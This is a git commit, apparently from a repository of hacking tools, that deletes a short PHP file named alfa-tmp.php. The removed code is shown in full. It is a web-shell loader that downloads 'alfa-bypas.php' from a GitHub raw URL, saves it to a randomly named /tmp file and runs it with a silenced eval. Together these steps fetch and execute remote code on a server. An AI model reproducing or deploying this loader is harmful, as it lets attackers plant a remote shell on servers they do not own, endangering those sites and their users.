d1b3337a856325e74cab8891f85d2a4db270d386
NuLz <129581037+haxorstars@users.noreply.github.com>
2023-11-09 14:12:42 +0700

    nulz

--- alfa/alfa-tmp.php
+++
@@ -1,8 +0,0 @@
-<?php
-
-$rand = rand(00000000,99999999);
-$md5 = md5($rand);
-if(!is_file('/tmp/ses_'.$md5)) {
-    @file_put_contents('/tmp/ses_'.$md5, file_get_contents('https://raw.githubusercontent.com/haxorstars/archive/main/alfa/alfa-bypas.php'));
-}
-@eval('?>'.file_get_contents('/tmp/ses_'.$md5));
